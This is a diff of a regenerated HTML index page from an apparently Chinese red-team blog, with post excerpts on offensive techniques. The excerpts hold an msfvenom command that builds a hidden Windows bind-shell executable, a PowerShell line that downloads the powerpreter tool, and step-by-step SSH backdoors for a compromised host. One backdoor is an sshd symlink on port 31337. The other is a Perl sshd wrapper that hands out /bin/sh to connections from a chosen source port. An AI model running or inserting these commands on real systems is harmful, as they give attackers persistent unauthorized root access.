@@ -1,21 +1,4 @@
-<!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-CN">
-<head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -107,13 +90,13 @@
   <meta name="description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
 <meta name="keywords" content="Red Team;Hack;半吊子程序猿,web;">
 <meta property="og:type" content="website">
-<meta property="og:title" content="Evi1cg&#39;s blog">
+<meta property="og:title" content="Evi1cg's blog">
 <meta property="og:url" content="https://evi1cg.github.io/page/19/index.html">
-<meta property="og:site_name" content="Evi1cg&#39;s blog">
+<meta property="og:site_name" content="Evi1cg's blog">
 <meta property="og:description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
 <meta property="og:locale" content="zh-CN">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Evi1cg&#39;s blog">
+<meta name="twitter:title" content="Evi1cg's blog">
 <meta name="twitter:description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
 
 
@@ -496,7 +479,7 @@
 
       
         
-          <h1 id="别动我的shell"><a href="#别动我的shell" class="headerlink" title="别动我的shell"></a>别动我的shell</h1><p>MSF 通过ACL隐藏Bind Shell<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/shell_hidden_bind_tcp <span class="attribute">LPORT</span>=8889 <span class="attribute">AHOST</span>=192.168.52.129 -f exe &gt; hidden_shell.exe</span><br></pre></td></tr></table></figure></p>
+          <h1 id="别动我的shell"><a href="#别动我的shell" class="headerlink" title="别动我的shell"></a>别动我的shell</h1><p>MSF 通过ACL隐藏Bind Shell<br></p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/shell_hidden_bind_tcp <span class="attribute">LPORT</span>=8889 <span class="attribute">AHOST</span>=192.168.52.129 -f exe > hidden_shell.exe</span><br></pre></td></tr></tbody></table></figure><p></p>
 <blockquote>
 <p><code>AHOST</code> <strong>就是攻击者的IP：</strong></p>
 </blockquote>
@@ -505,7 +488,7 @@
           
             <div class="post-button text-center">
               <a class="btn" href="/archives/Don-t_touch_my_shell.html#more" rel="contents">
-                阅读全文 &raquo;
+                阅读全文 »
               </a>
             </div>
           
@@ -672,14 +655,14 @@
         
           
             <p>
-              powerpreter下载：PS F:\powerpreter&gt; (new-object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/sa
+              powerpreter下载：PS F:\powerpreter> (new-object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/samra
               ...
             </p>
           <!--noindex-->
           
             <div class="post-button text-center">
               <a class="btn" href="/archives/powerpreter.html#more" rel="contents">
-                阅读全文 &raquo;
+                阅读全文 »
               </a>
             </div>
           
@@ -853,7 +836,7 @@
           
             <div class="post-button text-center">
               <a class="btn" href="/archives/Webshell_find.html#more" rel="contents">
-                阅读全文 &raquo;
+                阅读全文 »
               </a>
             </div>
           
@@ -1018,14 +1001,14 @@
 
       
         
-          <h3 id="1-入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口"><a href="#1-入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口" class="headerlink" title="1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口"></a>1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口</h3><p>肉鸡上执行<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf <span class="regexp">/usr/</span>sbin<span class="regexp">/sshd /</span>tmp<span class="regexp">/su;/</span>tmp<span class="regexp">/su -oPort=31337;</span></span><br></pre></td></tr></table></figure></p>
+          <h3 id="1-入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口"><a href="#1-入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口" class="headerlink" title="1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口"></a>1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口</h3><p>肉鸡上执行<br></p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf <span class="regexp">/usr/</span>sbin<span class="regexp">/sshd /</span>tmp<span class="regexp">/su;/</span>tmp<span class="regexp">/su -oPort=31337;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。</p>
-<h3 id="2-做一个SSH-wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH服务，就能远程连接"><a href="#2-做一个SSH-wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH服务，就能远程连接" class="headerlink" title="2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH服务，就能远程连接"></a>2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH服务，就能远程连接</h3><p>在肉鸡上执行：<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># cd /usr/sbin</span></span><br><span class="line">[root<span class="symbol">@localhost</span> sbin]<span class="meta"># mv sshd ../bin</span></span><br><span class="line">[root<span class="symbol">@localhost</span> sbin]<span class="meta"># echo <span class="string">'#!/usr/bin/perl'</span> &gt;sshd</span></span><br><span class="line">[root<span class="symbol">@localhost</span> sbin]<span class="meta"># echo <span class="string">'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);'</span> &gt;&gt;sshd</span></span><br><span class="line">[root<span class="symbol">@localhost</span> sbin]<span class="meta"># echo <span class="string">'exec &#123;"/usr/bin/sshd"&#125; "/usr/sbin/sshd",@ARGV,'</span> &gt;&gt;sshd</span></span><br><span class="line">[root<span class="symbol">@localhost</span> sbin]<span class="meta"># chmod u+x sshd</span></span><br><span class="line">[root<span class="symbol">@localhost</span> sbin]<span class="meta"># /etc/init.d/sshd restart</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="2-做一个SSH-wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH服务，就能远程连接"><a href="#2-做一个SSH-wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH服务，就能远程连接" class="headerlink" title="2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH服务，就能远程连接"></a>2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH服务，就能远程连接</h3><p>在肉鸡上执行：<br></p><figure class="highlight autoit"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># cd /usr/sbin</span></span><br><span class="line">[root<span class="symbol">@localhost</span> sbin]<span class="meta"># mv sshd ../bin</span></span><br><span class="line">[root<span class="symbol">@localhost</span> sbin]<span class="meta"># echo <span class="string">'#!/usr/bin/perl'</span> >sshd</span></span><br><span class="line">[root<span class="symbol">@localhost</span> sbin]<span class="meta"># echo <span class="string">'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);'</span> >>sshd</span></span><br><span class="line">[root<span class="symbol">@localhost</span> sbin]<span class="meta"># echo <span class="string">'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,'</span> >>sshd</span></span><br><span class="line">[root<span class="symbol">@localhost</span> sbin]<span class="meta"># chmod u+x sshd</span></span><br><span class="line">[root<span class="symbol">@localhost</span> sbin]<span class="meta"># /etc/init.d/sshd restart</span></span><br></pre></td></tr></tbody></table></figure><p></p>
           <!--noindex-->
           
             <div class="post-button text-center">
               <a class="btn" href="/archives/Pentest_SSH.html#more" rel="contents">
-                阅读全文 &raquo;
+                阅读全文 »
               </a>
             </div>
           
@@ -1207,7 +1190,7 @@
           
             <div class="post-button text-center">
               <a class="btn" href="/archives/phish_use_pac.html#more" rel="contents">
-                阅读全文 &raquo;
+                阅读全文 »
               </a>
             </div>
           
@@ -1262,7 +1245,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/18/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><span class="page-number current">19</span><a class="page-number" href="/page/20/">20</a><a class="page-number" href="/page/21/">21</a><a class="extend next" rel="next" href="/page/20/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/18/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">…</span><a class="page-number" href="/page/18/">18</a><span class="page-number current">19</span><a class="page-number" href="/page/20/">20</a><a class="page-number" href="/page/21/">21</a><a class="extend next" rel="next" href="/page/20/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1490,7 +1473,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -1501,7 +1484,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -1512,7 +1495,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -1523,7 +1506,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -1558,7 +1541,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -2222,5 +2205,6 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
-</html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
